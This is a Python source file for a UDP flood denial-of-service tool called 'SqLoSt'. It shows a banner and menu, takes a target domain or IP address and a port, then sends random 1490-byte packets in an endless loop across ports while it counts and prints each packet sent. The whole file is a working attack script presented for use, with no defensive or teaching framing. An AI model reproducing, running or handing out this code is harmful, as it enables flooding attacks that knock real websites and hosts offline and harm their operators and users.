from platform import system
import os
import time
import random
import socket
from urllib import request
import sys
path=os.getcwd()
path=os.path.join(path,'lib')
sys.path.append(path)
import colorama
from colorama import Fore,Back,Style
from tqdm.auto import tqdm
de_version="1.1"
colorama.init()
def clearConsole():
    command = 'clear'
    if os.name in ('nt', 'dos'):  
        command = 'cls'
    os.system(command)
    
def ddos():    
    def banner():
        clearConsole()
        print(Fore.RED+'''
DDDDDDDDDDDDD                                             SSSSSSSSSSSSSSS
D::::::::::::DDD                                        SS:::::::::::::::S
D:::::::::::::::DD                                     S:::::SSSSSS::::::S
DDD:::::DDDDD:::::D                                    S:::::S     SSSSSSS
  D:::::D    D:::::D    ooooooooooo       ssssssssss   S:::::S
  D:::::D     D:::::D oo:::::::::::oo   ss::::::::::s  S:::::S
  D:::::D     D:::::Do:::::::::::::::oss:::::::::::::s  S::::SSSS
  D:::::D     D:::::Do:::::ooooo:::::os::::::ssss:::::s  SS::::::SSSSS
  D:::::D     D:::::Do::::o     o::::o s:::::s  ssssss     SSS::::::::SS
  D:::::D     D:::::Do::::o     o::::o   s::::::s             SSSSSS::::S
  D:::::D     D:::::Do::::o     o::::o      s::::::s               S:::::S
  D:::::D    D:::::D o::::o     o::::ossssss   s:::::s             S:::::S
DDD:::::DDDDD:::::D  o:::::ooooo:::::os:::::ssss::::::sSSSSSSS     S:::::S
D:::::::::::::::DD   o:::::::::::::::os::::::::::::::s S::::::SSSSSS:::::S
D::::::::::::DDD      oo:::::::::::oo  s:::::::::::ss  S:::::::::::::::SS
DDDDDDDDDDDDD           ooooooooooo     sssssssssss     SSSSSSSSSSSSSSS
   '''+Style.RESET_ALL+Fore.GREEN+Style.BRIGHT+''' 
                       «-------{ SQLOST }-------»       
    '''+Style.RESET_ALL+Fore.YELLOW+Style.BRIGHT+'''
                      <3<3<3 Version 2.1v <3<3<3
  '''+Style.RESET_ALL+Fore.MAGENTA+Style.BRIGHT+'''
Script : SqLoSt {https://github.com/SqLoSt}
        '''+Style.RESET_ALL)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)

    def chech_con():
        try:
            request.urlopen('https://www.google.co.in/',timeout=3)
        except KeyboardInterrupt:
            print(Fore.RED+Style.BRIGHT + "KeyboardInterrupt : Shutting..." + Fore.RESET)
            exit()
        except:
            print(Fore.RED+Style.BRIGHT+'Chechk your internet connection.'+Fore.RESET)
            exit()
 
    try:
        print(Fore.CYAN+Style.BRIGHT+"Connecting to internet..."+Fore.RESET)
        for i in tqdm(range(30000)):
            print(end=Fore.MAGENTA+Style.BRIGHT+'\r')

        time.sleep(1)
        chech_con()

    except KeyboardInterrupt:
        print(Fore.RED +Style.BRIGHT+ "KeyboardInterrupt : Shutting..." + Fore.RESET)
        exit()
    try:
        while True:
            banner()
            print(Fore.GREEN+Style.BRIGHT+"[D]  "+Style.RESET_ALL+Fore.YELLOW+"Web Domain"+Fore.GREEN+Style.BRIGHT+"\n[IP] "+Style.RESET_ALL+Fore.YELLOW+"IP Adress"+Fore.GREEN+Style.BRIGHT+"\n[X]  "+Style.RESET_ALL+Fore.YELLOW+"EXIT")
            opt=str(input(Fore.RED+Style.BRIGHT+"\n>>> "+Fore.RESET))
            if opt=='D':
                domain=str(input(Fore.CYAN+Style.BRIGHT+"Domain of website (ex:youtube.com) :"+Fore.RESET))
                ip=socket.gethostbyname(domain)
                break
            elif opt=='IP':
                ip = input(Fore.CYAN+Style.BRIGHT+"IP Adress : "+Fore.RESET)
                break
            elif opt=='X':
                time.sleep(1)
                print(Fore.RED+"Leaving."+Fore.RESET)
                time.sleep(1)
                print(Fore.RED+"Leaving.."+Fore.RESET)
                time.sleep(1)
                print(Fore.RED+"Leaving..."+Fore.RESET)
                print(Fore.RED+"SEE YOU LATER!"+Fore.RESET)
                exit()
            else:
                print(Fore.RED+'Invalid/Undefined option!'+Fore.RESET)
                time.sleep(2)

        port =int(input(Fore.CYAN+Style.BRIGHT+"Port number :"+Fore.RESET))

        print(Fore.YELLOW+Style.BRIGHT+"Starting..."+Style.RESET_ALL)
        clearConsole()
        time.sleep(2)

        print(Fore.RED+Back.LIGHTGREEN_EX+"[Commuting Attack..]"+Style.RESET_ALL)
        for i in tqdm(range(30000)):
            print(end=Fore.MAGENTA+'\r')
        time.sleep(1)
        sent = 0
    except Exception as e:
        print(Fore.RED+"Something gone wrong...")
        print("Problem: ",e,Fore.RESET)
        time.sleep(3)
        ddos()
    try:
        while True:
            sock.sendto(bytes, (ip,port))
            sent=sent+1
            port=port+1
            color_list = [Fore.RED+Style.BRIGHT+Back.MAGENTA, Fore.GREEN+Style.BRIGHT+Back.RED, Fore.YELLOW+Style.BRIGHT+Back.GREEN, Fore.BLUE+Style.BRIGHT+Back.CYAN, Fore.MAGENTA+Style.BRIGHT+Back.WHITE, Fore.CYAN+Style.BRIGHT+Back.BLUE, Fore.WHITE+Style.BRIGHT+Back.RED ]
            color_random = random.choice(color_list)

            print(color_random+"Packet %s sent to ip %s and Port %s" % (sent, ip, port))
            if port==65534:
                port=1
            elif port==1900:
                port=1901
    except Exception as e:
        print(Fore.RED+Style.BRIGHT+"Terminated\nReason: ",e,Fore.RESET)
        time.sleep(3)
        ddos()
    except KeyboardInterrupt:
        print(Fore.RED+Style.BRIGHT+"\nKeyboardInterrupt : Leaving..."+Fore.RESET)



ddos()
